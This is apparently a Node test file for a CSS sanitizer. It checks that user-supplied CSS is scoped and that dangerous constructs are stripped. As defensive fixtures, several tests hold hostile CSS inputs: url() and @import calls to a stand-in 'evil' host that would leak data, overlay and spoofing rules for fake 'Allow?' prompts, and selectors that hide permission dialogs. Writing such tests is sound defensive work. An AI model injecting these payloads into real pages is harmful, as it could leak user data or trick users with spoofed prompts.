import test from "node:test"
import assert from "node:assert/strict"

import { sanitizeBlockCss, sanitizeContentCss, sanitizeHudCss, intersectThemeTokens } from "../src/lib/cssSanitizer.js"

test("block CSS: allowed declarations pass, scoped under .ovl-rich", () => {
  const { css } = sanitizeBlockCss(".ovl-terminal { color: #0f0; background: #111; padding: 8px; font-family: monospace }")
  assert.match(css, /\.ovl-rich \.ovl-terminal/)
  assert.match(css, /color: #0f0/)
  assert.match(css, /background: #111/)
  assert.match(css, /padding: 8px/)
})

test("block CSS: spoofing/overlay properties are dropped", () => {
  const { css, issues } = sanitizeBlockCss(
    ".ovl-x { position: fixed; inset: 0; z-index: 99999; pointer-events: none; cursor: none; content: 'Allow?'; color: red }",
  )
  // only the harmless color survives
  assert.match(css, /color: red/)
  for (const bad of ["position", "inset", "z-index", "pointer-events", "cursor", "content"]) {
    assert.doesNotMatch(css, new RegExp(bad))
  }
  assert.ok(issues.length >= 6)
})

test("block CSS: url()/@import/expression exfil + smuggling dropped", () => {
  const r1 = sanitizeBlockCss(".ovl-x { background: url('http://evil/?c=1'); color: blue }")
  assert.doesNotMatch(r1.css, /url\(/)
  assert.match(r1.css, /color: blue/)

  const r2 = sanitizeBlockCss("@import url('http://evil/x.css'); .ovl-x { color: blue }")
  assert.doesNotMatch(r2.css, /@import/)
  assert.match(r2.css, /color: blue/)

  const r3 = sanitizeBlockCss("@font-face { font-family: x; src: url('http://evil') } .ovl-x { color: blue }")
  assert.doesNotMatch(r3.css, /@font-face/)
  assert.doesNotMatch(r3.css, /url\(/)
})

test("block CSS: @media still stripped, but @keyframes is scoped + kept (controlled motion)", () => {
  const { css } = sanitizeBlockCss(
    "@keyframes blink { from {opacity:0} to {opacity:1} } @media (min-width:1px){ .ovl-x{color:red} } .ovl-y { color: green }",
  )
  // the author's @media dropped; the rule it wrapped goes with it. (The only
  // @media in the output is our trusted injected reduced-motion override.)
  assert.doesNotMatch(css, /min-width/)
  assert.doesNotMatch(css, /color: red/)
  // @keyframes kept, name scoped to ovl-
  assert.match(css, /@keyframes ovl-blink \{/)
  assert.match(css, /opacity: 0/)
  assert.match(css, /\.ovl-rich \.ovl-y.*color: green/s)
})

test("block CSS: animation allowed; keyframes ref rewritten; infinite capped; reduced-motion injected", () => {
  const { css } = sanitizeBlockCss(
    "@keyframes pulse { from {opacity:1} to {opacity:0.3} } .ovl-x { animation: pulse 1s infinite; transition: opacity 0.3s }",
  )
  // animation/transition survive; keyframes ref rewritten to scoped form;
  // infinite → 3 (finite cap)
  assert.match(css, /animation: ovl-pulse 1s 3/)
  assert.doesNotMatch(css, /infinite/)
  assert.match(css, /transition: opacity 0\.3s/)
  // reduced-motion override appended (trusted, with !important)
  assert.match(css, /@media \(prefers-reduced-motion: reduce\)/)
  assert.match(css, /animation: none !important/)
})

test("block CSS: invalid keyframe stops dropped; url() in a keyframe stripped", () => {
  const { css } = sanitizeBlockCss(
    "@keyframes k { 0% {color:red} bogus {color:blue} 100% {background:url('http://e')} }",
  )
  assert.match(css, /@keyframes ovl-k/)
  assert.match(css, /0% \{ color: red \}/)
  assert.doesNotMatch(css, /bogus|blue/)
  assert.doesNotMatch(css, /url\(/)
})

test("block CSS: no reduced-motion override when there is no motion", () => {
  const { css } = sanitizeBlockCss(".ovl-x { color: red }")
  assert.doesNotMatch(css, /prefers-reduced-motion/)
})

test("block CSS: selectors escaping scope are rejected", () => {
  const { css, issues } = sanitizeBlockCss(":root { --paper: #000 } html, body { background: black } .ovl-x { color: red }")
  assert.doesNotMatch(css, /:root|\bhtml\b|\bbody\b/)
  assert.match(css, /\.ovl-rich \.ovl-x/)
  assert.ok(issues.some((i) => /escaping scope/.test(i)))
})

test("block CSS: chrome-targeting selectors rejected (defense in depth)", () => {
  const { css } = sanitizeBlockCss(".permission-modal { display: none } .settings-modal { opacity: 0 } .ovl-x { color: red }")
  assert.doesNotMatch(css, /permission|settings/)
  assert.match(css, /\.ovl-rich \.ovl-x/)
})

test("block CSS: !important is stripped so app fallbacks stay winnable", () => {
  const { css } = sanitizeBlockCss(".ovl-x { color: red !important }")
  assert.match(css, /color: red/)
  assert.doesNotMatch(css, /important/i)
})

test("block CSS: malformed input does not throw and recovers partial rules", () => {
  assert.doesNotThrow(() => sanitizeBlockCss(".ovl-x { color: red ; ; bogus } .ovl-y { color: blue"))
  const { css } = sanitizeBlockCss(".ovl-x { color: red } .broken {{{ .ovl-y { color: blue }")
  assert.match(css, /color: red/)
})

test("content CSS: only allowlisted content selectors survive, scoped under #ovl-content", () => {
  const { css, issues } = sanitizeContentCss(
    ".entry-para { line-height: 1.8 } .option { border: 1px solid } .composer-input { display: none } .random-thing { color: red }",
  )
  assert.match(css, /#ovl-content \.entry-para/)
  assert.match(css, /#ovl-content \.option/)
  assert.doesNotMatch(css, /composer|random-thing/)
  assert.ok(issues.some((i) => /non-allowlisted content selector/.test(i)))
})

test("hud CSS: root .ovl-hud targets the HUD root element itself", () => {
  const { css } = sanitizeHudCss(
    ".ovl-hud { background: #fff; padding: 8px } .ovl-hud .ovl-hud-slot { gap: 4px } .hud-root { border-radius: 0 } .hud-root .hud-slot { display: flex } .ovl-hud-value { color: #111 }",
  )
  assert.match(css, /#ovl-hud-root\.ovl-hud \{ background: #fff; padding: 8px \}/)
  assert.match(css, /#ovl-hud-root\.ovl-hud \.ovl-hud-slot \{ gap: 4px \}/)
  assert.match(css, /#ovl-hud-root\.hud-root \{ border-radius: 0 \}/)
  assert.match(css, /#ovl-hud-root\.hud-root \.hud-slot \{ display: flex \}/)
  assert.match(css, /#ovl-hud-root \.ovl-hud-value \{ color: #111 \}/)
  assert.doesNotMatch(css, /#ovl-hud-root \.ovl-hud \{/)
  assert.doesNotMatch(css, /#ovl-hud-root \.hud-root \{/)
})

test("theme tokens: allowlist intersect, unsafe values dropped", () => {
  const { tokens, issues } = intersectThemeTokens({
    "--paper": "#101010",
    "--ink": "#eaeaea",
    "--evil": "red",
    "--paper-soft": "url('http://evil')",
  })
  assert.equal(tokens["--paper"], "#101010")
  assert.equal(tokens["--ink"], "#eaeaea")
  assert.equal(tokens["--evil"], undefined)
  assert.equal(tokens["--paper-soft"], undefined)
  assert.ok(issues.length >= 2)
})

test("empty / non-string inputs are safe", () => {
  assert.deepEqual(sanitizeBlockCss("").css, "")
  assert.deepEqual(sanitizeBlockCss(null).css, "")
  assert.deepEqual(intersectThemeTokens(null).tokens, {})
})
